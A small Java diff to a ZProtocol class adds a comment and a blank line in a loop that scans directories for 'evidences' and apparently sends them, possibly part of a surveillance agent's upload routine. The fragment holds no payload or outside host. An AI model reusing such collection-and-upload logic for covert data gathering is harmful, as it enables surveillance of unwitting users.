@@ -730,8 +730,9 @@ public class ZProtocol extends Protocol {
 		final int dsize = dirs.size();
 		if(Cfg.DEBUG) Check.log( TAG + " sendEvidences #directories: " + dsize);
 		for (int i = 0; i < dsize; ++i) {
-			final String dir = (String) dirs.elementAt(i);
+			final String dir = (String) dirs.elementAt(i); //  per reverse: dsize-i-1
 			final String[] logs = logCollector.scanForEvidences(basePath, dir);
+			
 			final int lsize = logs.length;
 			if(Cfg.DEBUG) Check.log( TAG + "    dir: " + dir + " #evidences: " + lsize);
 			// for (int j = 0; j < lsize; ++j) {
